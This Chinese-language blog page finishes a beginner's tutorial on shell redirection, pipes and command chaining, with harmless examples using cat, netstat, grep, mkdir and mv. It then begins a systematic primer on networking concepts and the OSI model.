<p><img src="https://lh5.googleusercontent.com/PPet_RllllnSmYALmxV56ohy5NZz1kj76GzbmcvM9HJDrqY6h74otCFL1E0rG_lEKnALViM8zv2E4BOj4bUUTixzD_QTTXsmoh0-U3dxJROpiAfvW2vHZ69s2vpYlq88-6FBngqgzSQ" alt="不见图 请翻墙"><br>（动画：“标准输入输出”的效果）</p>
<p>　　请注意，第1行 <code>test</code> 是针对 <code>cat</code> 进程的【输入】，对应于【stdin】（你之所以能看到这行，是因为前面所说的【终端回显】）<br>　　第2行 <code>test</code> 是 <code>cat</code> 进程拿到输入文本之后的原样输出，对应于【stdout】。</p>
<h3 id="◇“标准流”的【重定向】"><a href="#◇“标准流”的【重定向】" class="headerlink" title="◇“标准流”的【重定向】"></a>◇“标准流”的【<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Redirection_(computing)">重定向</a>】</h3><p>　　所谓的【重定向】大体上分两种：</p>
<p><strong>1. 【输入流】重定向</strong><br>　　把某个文件重定向为 stdin；此时进程通过 stdin 读取的是该文件的内容。<br>　　这种玩法使用小于号（<code>&lt;</code>）</p>
<p><strong>2. 【输出流】重定向</strong><br>　　把 stdout 重定向到某个文件；此时进程写入 stdout 的内容会【覆盖 or 追加】到这个文件。<br>　　这种玩法使用【单个】大于号（<code>&gt;</code>）或【两个】大于号（<code>&gt;&gt;</code>）。前者用于【覆盖】文件内容，后者用于【追加】文件内容。</p>
<p>　　另外，有时候你会看到 <code>2&gt;&amp;1</code> 这种写法。它表示：把 stderr 合并到 stdout。<br>　　（注：前面俺提到过——stdout 是“数值为 1 的文件描述符”；stderr 是“数值为 2 的文件描述符”）</p>
<h3 id="◇【重定向】举例"><a href="#◇【重定向】举例" class="headerlink" title="◇【重定向】举例"></a>◇【重定向】举例</h3><p><strong>cat 的例子</strong><br>　　下面这个命令把某个文件重定向到 <code>cat</code> 的 stdin。</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-built_in">cat</span> &lt; 文件名<br></code></pre></td></tr></table></figure>

<p>　　很多菜鸟容易把上面的命令与下面的命令搞混淆。<br>　　请注意：上面的命令用的是【输入重定向】，而下面的命令用的是【命令行参数】。</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-built_in">cat</span> 文件名<br></code></pre></td></tr></table></figure>

<p><code>cat</code> 命令还可以起到类似“文件复制”的效果。<br>　　比如你已经有个 <code>文件1</code>，用下面这种玩法，会创建出一个内容完全相同的 <code>文件2</code>。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> &lt; 文件<span class="hljs-number">1</span> &gt; 文件<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
<p>　　某些同学可能会问了：既然能这么玩，为啥还需要用 <code>cp</code> 命令进行文件复制捏？<br>　　原因在于：<code>cat</code> 的玩法，只保证内容一样，其它的不管；而 <code>cp</code> 除了复制文件内容，还会确保“目标文件”与“源文件”具有相同的属性（比如 mode）。</p>
<p><strong>更多的例子</strong><br>　　在之前那篇《<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2019/09/Netcat-Tricks.html">扫盲 netcat（网猫）的 N 种用法——从“网络诊断”到“系统入侵”</a>》，里面介绍了十多种 nc 的玩法。很多都用到了【重定向】。</p>
<h2 id="★匿名管道（anonymous-pipe）"><a href="#★匿名管道（anonymous-pipe）" class="headerlink" title="★匿名管道（anonymous pipe）"></a>★匿名管道（anonymous pipe）</h2><h3 id="◇“匿名管道”的【原理】"><a href="#◇“匿名管道”的【原理】" class="headerlink" title="◇“匿名管道”的【原理】"></a>◇“匿名管道”的【原理】</h3><p>　　在大部分 shell 中，使用竖线符号（<code>|</code>）来表示【管道符】。用它来创建一个【<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Anonymous_pipe">匿名管道</a>】，使得前一个命令（进程）的“标准输出”关联到后一个命令（进程）的“标准输入”。</p>
<h3 id="◇举例"><a href="#◇举例" class="headerlink" title="◇举例"></a>◇举例</h3><p>　　俺曾经在“<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2013/01/cross-host-use-gfw-tool.html">这篇博文</a>”中介绍过——如何用 <code>netstat</code> 查看当前系统的监听端口。<br>　　对于 Windows 系统，可以用如下命令：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netstat -an | <span class="hljs-builtin-name">find</span> <span class="hljs-string">&quot;LISTEN&quot;</span><br></code></pre></td></tr></table></figure>
<p>　　对于 POSIX 系统，可以用如下命令：</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">netstat -an <span class="hljs-string">| grep &quot;</span>LISTEN<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>

<p>　　在上述两个例子中，都用到了【管道符】。因为 <code>netstat -an</code> 这个命令的输出可能会很多，先把它的输出通过【匿名管道】丢给某个专门负责过滤的命令（比如：POSIX 的 grep 或 Windows 的find）。当这个过滤命令拿到 <code>netstat</code> 的输出内容，再根据你在命令行参数中指定的【关键字】（也就是上述例子中的 <code>LISTEN</code>），过滤出包含【关键字】的那些【行】。<br>　　最终，你看到的是“过滤命令”（grep 或 find）的输出。</p>
<h3 id="◇【串联的】匿名管道（chained-pipeline）"><a href="#◇【串联的】匿名管道（chained-pipeline）" class="headerlink" title="◇【串联的】匿名管道（chained pipeline）"></a>◇【串联的】匿名管道（chained pipeline）</h3><p>　　前面的例子，可以用来列出当前系统中所有的监听端口。<br>　　现在，假设你运行了 Tor Browser，然后想看看它到底有没有开启 <code>9150</code> 这个监听端口，那么你就可以在上述命令中进行【二次过滤】（具体命令大致如下）。这就是所谓的【串联】。</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">netstat -an | <span class="hljs-type">grep</span> <span class="hljs-string">&quot;LISTEN&quot;</span> | <span class="hljs-type">grep</span> <span class="hljs-string">&quot;9150&quot;</span><br></code></pre></td></tr></table></figure>


<h3 id="◇“匿名管道”与“作业”（进程组）"><a href="#◇“匿名管道”与“作业”（进程组）" class="headerlink" title="◇“匿名管道”与“作业”（进程组）"></a>◇“匿名管道”与“作业”（进程组）</h3><p>　　用“匿名管道”串起来的多个进程，构成一个“作业”（这点前面提到了）。<br>　　你可以尝试执行某个长寿命的，带管道符的命令行，然后用 <code>Ctrl + Z</code> 切到后台，再执行 <code>jobs</code> 看一下，就能看出——该命令行对应的【多个】进程属于同一个 job。</p>
<h2 id="★批处理（batch）"><a href="#★批处理（batch）" class="headerlink" title="★批处理（batch）"></a>★批处理（batch）</h2><h3 id="◇啥是“批处理”？"><a href="#◇啥是“批处理”？" class="headerlink" title="◇啥是“批处理”？"></a>◇啥是“批处理”？</h3><p>　　通俗地说就是：同时执行多个命令。<br>　　为了支持“批处理”，shell 需要提供若干语法规则。而且不同类型的 shell，用来搞“批处理”的语法规则也存在差异。<br>　　在本章节中，俺以 bash 来举例。</p>
<h3 id="◇【无】条件的“批处理”"><a href="#◇【无】条件的“批处理”" class="headerlink" title="◇【无】条件的“批处理”"></a>◇【无】条件的“批处理”</h3><p>　　如果你把多个命令写在同一行，并且命令之间用半角分号隔开，这种玩法就属于【无条件】的批处理执行。<br>　　举例：<br>　　假设当前目录下有一个 <code>abc.txt</code> 文件，然后要在当前目录下创建一个名为 <code>xxx</code> 的子目录，并把 <code>abc.txt</code> 移动到这个新创建的子目录中。你可以用如下方式搞定（只用【一行】命令）</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mkdir .<span class="hljs-regexp">/xxx/</span>; mv abc.txt .<span class="hljs-regexp">/xxx/</span><br></code></pre></td></tr></table></figure>

<p>　　为啥这种方式叫做“【无条件】批处理”捏？因为不管前一个“子命令”是否成功，都会继续执行下一个“子命令”。</p>
<p>　　请注意：<br>　　虽然俺上述举例只使用了两个“子命令”，但实际上这种玩法可以把 N 个“子命令”串起来。</p>
<h3 id="◇【有】条件的“批处理”"><a href="#◇【有】条件的“批处理”" class="headerlink" title="◇【有】条件的“批处理”"></a>◇【有】条件的“批处理”</h3><p>　　与“无条件”相对应的，当然是“有条件”啦。<br>　　这种玩法的意思是——后一个“子命令”是否执行，取决于【前一个】“子命令”的结果（成功 or 失败）。<br>　　（注：如何界定“成功/失败”，请参见前面某个章节聊到的【进程退出码】）<br>　　【有】条件的批处理，常见的方式有两种，分别是【逻辑与】、【逻辑或】。</p>
<p><strong>逻辑与（语法：<code>&amp;&amp;</code>）</strong><br>　　只要前面的某个“子命令”【失败】了，就【不再】执行后续的“子命令”。<br>　　举例：<br>　　还是拿前一个小节的例子。如下方式使用了“逻辑与”。如果创建子目录失败，就【不再】执行“移动文件”的操作</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mkdir .<span class="hljs-regexp">/xxx/</span> &amp;&amp; mv abc.txt .<span class="hljs-regexp">/xxx/</span><br></code></pre></td></tr></table></figure>

<p><strong>逻辑或（语法：<code>||</code>）</strong><br>　　只要前面的某个“子命令”【成功】了，就【不再】执行后续的“子命令”。<br>　　举例：<br>　　把上述例子进一步扩充，变为如下：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mkdir .<span class="hljs-regexp">/xxx/</span> &amp;&amp; mv abc.txt .<span class="hljs-regexp">/xxx/</span> || echo <span class="hljs-string">&quot;FAILED!!!&quot;</span><br></code></pre></td></tr></table></figure>

<p>　　这个有点复杂，俺稍微解释一下：<br>　　你把前面两句看作一个【整体】。其执行的逻辑参见前面所说的“逻辑与”。然后这个“整体”与后面的那句 <code>echo</code> 再组合成【逻辑或】的关系。<br>　　也就是说，如果前面的“整体”成功了，那么就【不】执行 <code>echo</code>（【不】打印错误信息）；反之，如果前面的“整体”失败了，就会打印错误信息。</p>
<h2 id="★shell-脚本"><a href="#★shell-脚本" class="headerlink" title="★shell 脚本"></a>★shell 脚本</h2><p>　　虽然前一个章节拿 bash 来举例。但其实有很多其它类型的 shell 都支持类似的“批处理”机制。<br>　　只要某个 shell 支持刚才所说的【有条件批处理】的机制，它就已经很接近【编程语言】了。<br>　　于是很自然地，那些 shell 的作者就会把 shell 逐步发展成某种【脚本语言】的解释器。然后就有了如今的“shell script”（shell 脚本）和“shell 编程”。<br>　　由于“shell 编程”这个话题比较大。哪怕俺只聊 bash 这一类 shell 的编程，也足够写上几万字的博文。考虑到本文已经很长了，这个话题就不再展开。<br>　　对此感兴趣的同学，可以参考俺分享的电子书。具体参见<a target="_blank" rel="noopener" href="https://github.com/programthink/books">电子书清单</a>的如下几本（这几本都位于【IT类 / 操作系统 / 使用教程】分类目录下）<br>《<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/1Zw8XD56F6rCi899UxIE-0sKoXWr2WGqiUNcRl70kIYk/">Shell 脚本学习指南</a>》（Classic Shell Scripting）<br>《<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/1Nk83xAbRUdcgqUBSfDCwozA3-EUFeBz-nrpf1G7x-j0/">Linux 与 UNIX Shell 编程指南</a>》（Linux and UNIX Shell Programming）<br>《<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/1BYSgrSViVZyDTQcuhWEFAc_uc0YZvkIoQYLmv0yWo_A/">高级 Bash 脚本编程指南</a>》（Advanced Bash-Scripting Guide）</p>
<h2 id="★结尾"><a href="#★结尾" class="headerlink" title="★结尾"></a>★结尾</h2><p>　　由于这篇涉及的内容比较杂，跨度也比较大。可能会有一些俺没覆盖到的地方。欢迎在博客留言中补充。<br>　　如果你发现本文的错误之处，也欢迎批评指正 :)</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-07-16T13:44:33.000Z" title="2021/7/16 下午9:44:33">2021-07-16</time>发表</span><span class="level-item"><time dateTime="2021-07-16T15:24:27.446Z" title="2021/7/16 下午11:24:27">2021-07-16</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/">计算机基础</a></span><span class="level-item">3 小时读完 (大约25716个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/07/16/%E5%A4%A7%E8%AF%9D%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">大话计算机网络</a></h1><div class="content"><h1 id="计算机网络通讯的【系统性】扫盲——从“基本概念”到“OSI-模型”"><a href="#计算机网络通讯的【系统性】扫盲——从“基本概念”到“OSI-模型”" class="headerlink" title="计算机网络通讯的【系统性】扫盲——从“基本概念”到“OSI 模型”"></a>计算机网络通讯的【系统性】扫盲——从“基本概念”到“OSI 模型”</h1><p><strong>文章目录</strong></p>
<p>★本文的目标读者<br>★基本概念<br>★从“分层”到“参考模型”<br>★OSI 概述<br>★物理层：概述<br>★物理层：具体实例<br>★链路层：概述<br>★链路层：具体实例<br>★网络层：概述<br>★网络层：具体实例<br>★传输层：概述<br>★传输层：具体实例<br>★业务层（OSI 上三层）：概述<br>★业务层（OSI 上三层）：具体实例<br>★杂项<br>★参考书目</p>
<p>　　近期老是在写政治博文，又有两个月左右没写技术博文了。某些技术型的读者，背地里肯定骂俺太懒。今天搞了一篇内容特别长，信息量特别多的。喜欢看技术博文的读者，可以慢慢消化。</p>
<h2 id="★本文的目标读者"><a href="#★本文的目标读者" class="headerlink" title="★本文的目标读者"></a>★本文的目标读者</h2><p>　　今天这篇的标题是“扫盲”，也就是说：即使那些完全不懂 IT 领域，也不懂通讯领域的读者，依然能看懂（至少能看懂一部分）。为了做到这点，俺会尽量使用通俗的比喻，并适当加一些示意图。<br>　　另外，就算你已经比较了解网络通讯领域，本文中提到的某些部分，也可能是你所不知道的。也就是说：懂行的同学，看看此文，也会有帮助。<br>　　本文的标题特地强调了【系统性】——俺希望这篇教程能帮助读者对“计算机网络”这个领域进行系统性学习（何为“系统性学习”？请看<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2019/10/Systematic-Learning.html">这篇教程</a>）<br>　　为了做到【系统性】这个目的，这篇教程很长。俺开博12年，这篇的长度估计能排到前5名。建议大伙儿慢慢看，不要着急。</p>
<h2 id="★基本概念"><a href="#★基本概念" class="headerlink" title="★基本概念"></a>★基本概念</h2><p>　　为了足够通俗，俺先要介绍一些基本概念。</p>
<h3 id="◇信道（channel）"><a href="#◇信道（channel）" class="headerlink" title="◇信道（channel）"></a>◇信道（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Communication_channel">channel</a>）</h3><p>　　这是通讯领域非常基本的概念，肯定要先聊聊它。<br>　　通俗地说，信道就是“传送信息的通道”。</p>
<h3 id="◇信道的类型"><a href="#◇信道的类型" class="headerlink" title="◇信道的类型"></a>◇信道的类型</h3><p>　　首先，信道可以从广义上分为“物理信道 ＆ 逻辑信道”。<br>　　顾名思义，“物理信道”就是直接使用某种【物理介质】来传送信息；至于“逻辑信道”——是基于“物理信道”之上抽象出来的玩意儿（待会儿讲到“协议栈”的时候再聊）。</p>
<h3 id="◇信道的带宽"><a href="#◇信道的带宽" class="headerlink" title="◇信道的带宽"></a>◇信道的带宽</h3><p>　　“带宽”指的是：某个信道在单位时间内最大能传输多少比特的信息。<br>　　请注意：<br>　　电气领域 ＆ 计算机领域都有“带宽”这个概念，但两者的定义不太一样。电气领域所说的“带宽”指的是“模拟带宽”，单位是“赫兹/Hz”；计算机领域所说的“带宽”指“数字带宽”，单位是“比特率”或“字节率”。<br>　　后续章节提到“带宽”，都是指计算机领域的术语。</p>
<h3 id="◇带宽的单位——容易把外行绕晕"><a href="#◇带宽的单位——容易把外行绕晕" class="headerlink" title="◇带宽的单位——容易把外行绕晕"></a>◇带宽的单位——容易把外行绕晕</h3><p>　　“比特率”或“字节率”很容易搞混淆。用英文表示的话——大写字母 <code>B</code> 表示【字节】；小写字母 <code>b</code> 表示【比特】。</p>
<p>　　由于带宽的数字通常很大，要引入“K、M、G”之类的字母表示数量级，于是又引出一个很扯蛋的差异——“10进制”与“2进制”的差异。<br>　　【10进制】的 <code>K</code> 表示 1000；<code>M</code> 表示 1000x1000（1百万）<br>　　【2进制】的 <code>K</code> 表示 1024（2的10次方）；<code>M</code> 表示 1024x1024（2的20次方）<br>　　为了避免扯皮，后来国际上约定了一个规矩：对【2进制】的数量级要加一个小写字母 <code>i</code>。比如说：<code>Ki</code> 表示 1024；<code>Mi</code> 表示 1024x1024 …… 以此类推。<br>　　举例：<br>　　1Kbps 表示“1000比特每秒”<br>　　1KiBps 表示“1024字节每秒”</p>
<h3 id="◇信道的工作模式：单工-VS-半双工-VS-全双工"><a href="#◇信道的工作模式：单工-VS-半双工-VS-全双工" class="headerlink" title="◇信道的工作模式：单工 VS 半双工 VS 全双工"></a>◇信道的工作模式：单工 VS 半双工 VS 全双工</h3><p>　　再来说说信道的工作模式。大致可以分为如下三种。为了让大伙儿比较好理解，俺对每一种都举相应的例子。</p>
<p><strong>单工（simplex）</strong><br>　　比如“电台广播”就是典型的【单工】。“电台”可以发信号给“收音机”，但“收音机”【不能】发信号给“电台”。</p>
<p><strong>半双工（half-duplex）</strong><br>　　比如“单条铁路轨道”，就是典型的【半双工】。火车在单条铁轨上，可以有两种运行方向；但对于同一个瞬间，只能选其中一个方向（否则就撞车了）。</p>
<p><strong>全双工（full-duplex）</strong><br>　　比如“光纤”就是典型的【全双工】。在同一根光导纤维中，可以有多个光束【同时相向】传播，互相不会干扰对方。</p>
<h3 id="◇端点"><a href="#◇端点" class="headerlink" title="◇端点"></a>◇端点</h3><p>　　为了叙述方便，俺把参与通讯的对象（主体）称作“通讯端点”，简称“端点”。<br>　　这里的“端点”是广义的，可以是硬件（比如某个网卡），也可以是软件（比如某个应用程序）。</p>
<h3 id="◇单播、组播-多播、广播、选播"><a href="#◇单播、组播-多播、广播、选播" class="headerlink" title="◇单播、组播/多播、广播、选播"></a>◇单播、组播/多播、广播、选播</h3><p>　　对于“网络通讯”，至少得有 N 个端点参与，并且【N ≥ 2】才有意义。<br>　　当 N 个端点构成一个网络，这时候就会涉及到“单播、组播、广播”这几个概念。<br>　　通俗地说：<br>单播（unicast）——发送给网络中的指定的【单个】端点<br>组播/多播（multicast）——发送给网络中的指定的【多个】端点<br>广播（broadcast）——发送给网络中的【所有】端点<br>选播（anycast）——发送给网络中随机选择的【单个】端点</p>
<h3 id="◇通讯协议（protocol）"><a href="#◇通讯协议（protocol）" class="headerlink" title="◇通讯协议（protocol）"></a>◇通讯协议（protocol）</h3><p>　　所谓的“通讯协议”就是：参与通讯的各方所采用的某种【约定】。只有大家都遵守这个约定，才有可能相互传递信息。<br>　　打个比方：如果两个人要用自然语言交流，前提是：双方使用相同（或相互兼容）的自然语言。<br>　　“通讯协议”就类似某种自然语言，参与通讯的多个端点，都必须能理解这个语言。</p>
<h2 id="★从“分层”到“参考模型”"><a href="#★从“分层”到“参考模型”" class="headerlink" title="★从“分层”到“参考模型”"></a>★从“分层”到“参考模型”</h2><h3 id="◇分层"><a href="#◇分层" class="headerlink" title="◇分层"></a>◇分层</h3><p>　　在聊“分层”之前，先说说“分工”。比如在一个公司中，通常设有不同的工种/岗位，这就【分工】。<br>　　对于网络通讯也是如此，不太可能用一种通讯协议完成所有的信息传递任务（注：对于特别简单的网络，或许有可能只用单一协议；但如今的网络通讯已经很复杂，用【单个】通讯协议包办所有事情，已经不太可能）<br>　　一旦采用了多种通讯协议，这几种协议之间，该如何配合捏？<br>　　在网络通讯领域，采用的是【分层】的设计思路。多个层次的协议在一起协同工作，技术上称作“协议栈”（洋文叫做“protocol stack”）。</p>
<h3 id="◇协议栈的原理"><a href="#◇协议栈的原理" class="headerlink" title="◇协议栈的原理"></a>◇协议栈的原理</h3><p>　　对于多层次的协议栈。每个层次都有各自的“端点”（进行通讯的主体）。处于【同一层次】的两个端点会使用该层次的协议进行通讯（注：同一个层次的协议，可能只有一个，也可能有多个）。<br>　　除了最顶层，每个层次的端点会向其【直接】上层提供“服务”；除了最底层，每个层次的端点会调用【直接】下层提供的“服务”（这里所说的“服务”指某种“编程接口”，技术行话叫 API）。</p>
<p><img src="https://lh3.googleusercontent.com/bK34KOVTYWmZNuIOY-0CxbJn1tR8LV_-78VflTiRK3rFM_YjVPa6lSbdxU58ICNFqTo2ghGjicgekyoZ4CNdFDe7ucMEM3BVHDA48S44mNn7e7Rf-5L3XDxYrjGDUpFp3AvkLDxb78w" alt="不见图 请翻墙"><br>（“协议栈”的示意图）</p>
<p><img src="https://lh5.googleusercontent.com/qfAnnow_Fl7VudJd1GS39MJxLfXymYvKQ7ISRvYoSG4RKl8AltCB2Ru86zf78ABHd3ZrzI6sNF9Z65I9z8-He26A7hSInp-Pf2Quduw26FHGWMb2VK5YK-yLWnG8F2UibWqgzYwGSaU" alt="不见图 请翻墙"><br>（“服务”与“协议”之间的关系）</p>
<h3 id="◇逻辑信道"><a href="#◇逻辑信道" class="headerlink" title="◇逻辑信道"></a>◇逻辑信道</h3><p>　　（前一个小节说了）每个层次会向上一个层次提供服务（API 调用）。对上层而言，调用下层提供的 API 发送信息，其效果相当于在使用某种【信道】进行通讯，这也就是俺在 ★基本概念 那个章节所说的“逻辑信道”。</p>
<p><img src="https://lh4.googleusercontent.com/OzflASXF1Xv5c3-eg-RiT4ENcwjZx4jpeVYlj01YI6I-1L-Wgjl3FE47Rc94Dn9JAcTnHGcEES1KcaSSjHkZQeG1iKWgamZWrMtC0QTMpbHnO7NQeZvuMIeS9Sx8pI7gNg7DlakovkY" alt="不见图 请翻墙"><br>（“逻辑信道”示意图）</p>
<h3 id="◇数据格式的原理"><a href="#◇数据格式的原理" class="headerlink" title="◇数据格式的原理"></a>◇数据格式的原理</h3><p>　　大部分协议会把要传送的数据切割为 N 份，每一份就是一个数据包。<br>　　通常来说，数据包的格式有如下三部分：</p>
<blockquote>
<p>头部<br>身体（也称作“有效载荷”）<br>尾部（注：很多协议没有尾部）</p>
</blockquote>
<p>　　如果你收过快递，可以把“网络数据包”与“快递包裹”作一个对照——<br>数据包的“头/尾”，就类似于快递包裹的【包装袋】。数据包的“身体”，就类似于快递包裹里面的东西。</p>
<p>　　对于【相邻】两层的协议，【下】层包含【上】层。也就是说：下层协议的【载荷】就是上层协议的【整体】。<br>　　还是以快递举例：<br>　　假设你从网上买了一台笔记本电脑。电脑出厂时，电脑厂商肯定会提供一个包装盒。快递公司在寄送这台笔记本的时候，又会在笔记本的盒子外面再加一个包装袋。对应到网络协议——“快递公司的包装袋”相当于【下层】协议；“电脑厂商的包装盒”，相当于【上层】协议。</p>
<p><img src="https://lh3.googleusercontent.com/bz_Gg8ow_9ZM4dqw9wEfGaEXZmpusHPT9pwhILsvusYq6XPZa__M5GsfF07xCnoAV-S2udQ0unbuAbUgWqx9vCgF71t7RgQhsgkNL6Ol76wueKdvWU-nukPat8i7VlVFXs2FDrthrt0" alt="不见图 请翻墙"><br>（上下层协议的格式及包含关系）</p>
<h3 id="◇网络分层的参考模型"><a href="#◇网络分层的参考模型" class="headerlink" title="◇网络分层的参考模型"></a>◇网络分层的参考模型</h3><p>　　上述所说的“分层 ＆ 协议栈”只是一个抽象的（笼统的）思路。具体要分几层？每一层要干啥事儿？这些都是很有讲究滴！网络技术发展了几十年，已经有很多牛人提出了各种不同的划分方案，称之为“网络分层的参考模型”（为了打字省力，以下简称“模型”）。<br>　　在各种模型中，名气最大的当然是“OSI 模型”（洋文称作“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/OSI_model">OSI model</a>”）。在后续的章节中，俺会以这个模型为主体，进行介绍。<br>　　除了“OSI 模型”还有一个很出名的模型是“TCP/IP 模型”（因为互联网很成功，它才跟着出名）。<br>　　对“TCP/IP 模型”的分层，不同的文章或书籍，说法不太一样（“3层、4层、5层”皆有），这就引发了一些争议。包括几位热心读者也在博客留言，表达不同意见。为了避免一家之言，贴出维基百科的“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Internet_protocol_suite#Layer_names_and_number_of_layers_in_the_literature">这个链接</a>”，其中给出了几种比较有名的说法。<br>　　另外，俺想提醒一下：<br>　　由于本文是基于【OSI 模型】进行展开。对于 TCP/IP 模型到底算几层，这方面的争论【不】影响本文后续的内容。</p>
<h2 id="★OSI-概述"><a href="#★OSI-概述" class="headerlink" title="★OSI 概述"></a>★OSI 概述</h2><h3 id="◇OSI-的历史"><a href="#◇OSI-的历史" class="headerlink" title="◇OSI 的历史"></a>◇OSI 的历史</h3><p>　　“OSI”的全称是“Open System Interconnection”。先说说它的历史。<br>　　上世纪70年代，“国际电信联盟”（ITU）想对各国的电信系统（电话/电报）建立标准化的规格；与此同时，“国际标准化组织”（ISO）想要建立某种统一的标准，使得不同公司制造的大型主机可以相互联网。<br>　　后来，这两个国际组织意识到：“电信系统互联”与“电脑主机互联”的性质差不多。于是 ISO 与 ITU 就决定合作，两家一起干。这2个组织的2套班子，从上世纪70年代开始搞，搞来搞去，搞了很多年，一直到1984年才终于正式发布 OSI 标准。</p>
<h3 id="◇OSI-标准的两个组成部分"><a href="#◇OSI-标准的两个组成部分" class="headerlink" title="◇OSI 标准的两个组成部分"></a>◇OSI 标准的两个组成部分</h3><p>　　严格来讲，OSI 包括两大部分——<br>其一，抽象的概念模型，也就是前面提到的【OSI model】；<br>其二，针对这个概念模型的具体实现（具体的通讯协议），洋文叫做【OSI protocols】。</p>
<p>　　（前面说了）OSI 是由 ISO ＆ ITU 联手搞出来滴。这两个国际组织里面的人，要么是来自各国的电信部门，要么是来自各国的高校学者。总而言之，既有严重的官僚风气，又有明显的学究风气。（正是因为这两种风气叠加，所以搞了很多年，才搞出 OSI）<br>　　OSI 的协议实现（OSI protocols），不客气地说，就是一堆垃圾——据说把 OSI protocols 所有的协议文档，全部打印成 A4 纸，摞起来得有一米多高！是不是很吓人？协议搞得如此复杂，严重违背了 IT 设计领域的 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/KISS_principle">KISS 原则</a>。<br>　　由于 OSI protocols 实在太复杂，后来基本没人用。但 OSI model 反而广为流传，并且成为“网络分层模型”中名气最大，影响力最广的一个。<br>　　因此，本文后续章节中，凡是提到 OSI，指的是【OSI model】。</p>
<h3 id="◇OSI-模型的7层"><a href="#◇OSI-模型的7层" class="headerlink" title="◇OSI 模型的7层"></a>◇OSI 模型的7层</h3><p>　　OSI 模型总共分7层，示意图参见如下表格：</p>
<table>
<thead>
<tr>
<th>层次</th>
<th>中文名</th>
<th>洋文名</th>
</tr>
</thead>
<tbody><tr>
<td>第7层</td>
<td>应用层</td>
<td>Application Layer</td>
</tr>
<tr>
<td>第6层</td>
<td>表示层</td>
<td>Presentation Layer</td>
</tr>
<tr>
<td>第5层</td>
<td>会话层</td>
<td>Session Layer</td>
</tr>
<tr>
<td>第4层</td>
<td>传输层</td>
<td>Transport Layer</td>
</tr>
<tr>
<td>第3层</td>
<td>网络层</td>
<td>Network Layer</td>
</tr>
<tr>
<td>第2层</td>
<td>数据链路层</td>
<td>Data Link Layer</td>
</tr>
<tr>
<td>第1层</td>
<td>物理层</td>
<td>Physical Layer</td>
</tr>
</tbody></table>
<p>（注：为了打字省力，在后续章节把“数据链路层”直接称为“链路层”）</p>
<p>　　考虑到本文是针对一般性读者的【扫盲教程】，俺重点聊第1~4层。搞明白这几个层次之后，有助于你更好地理解网络的很多概念，也有助于你更好地理解很多信息安全的概念。<br>　　接下来在讨论 OSI 的每个层次时，俺都会专门写一个小节，谈该层次的【必要性】。搞明白【必要性】，你就知道为啥要引入这个层次。</p>
<h2 id="★物理层：概述"><a href="#★物理层：概述" class="headerlink" title="★物理层：概述"></a>★物理层：概述</h2><h3 id="◇物理层的必要性"><a href="#◇物理层的必要性" class="headerlink" title="◇物理层的必要性"></a>◇物理层的必要性</h3><p>　　通俗地说：直接与物理介质打交道的层次，就是物理层。这一层的必要性比较明显。<br>　　因为所有的通讯，归根结底都要依赖于【物理介质】。与物理介质打交道，需要牵涉到很多与【物理学】相关的东东。比如：“无线电通讯”需要关心“频率/波长”；电缆通讯需要跟“电压”打交道；“光纤通讯”需要关心“玻璃的折射率＆光线的入射角” ……<br>　　“物理层”的主要职责是：屏蔽这些细节，使得“物理层”之上的层次不用再去操心物理学。</p>
<h3 id="◇物理信道的类型"><a href="#◇物理信道的类型" class="headerlink" title="◇物理信道的类型"></a>◇物理信道的类型</h3><p>　　何为“物理信道”，在本文开篇的“基本概念”已经提到了。<br>　　对于“物理信道”，还可以进一步细分为如下三大类：<br>\1. 有线信道（比如：双绞线、同轴电缆、光纤、等等）<br>\2. 无线信道（比如：微波通讯、电台广播、卫星通讯、等等）<br>\3. 存储信道</p>
<p>　　“存储信道”比较少见，很多人没听说过，稍微解释一下。<br>　　假设你要把一大坨信息传送给另一个人，除了用“有线 or 无线”这两种通讯方式，还可以把信息先保存到某种【存储介质】（比如硬盘），然后再把存储介质用某种方式（比如快递）转交给对方。这就是所谓的“存储信道”。</p>
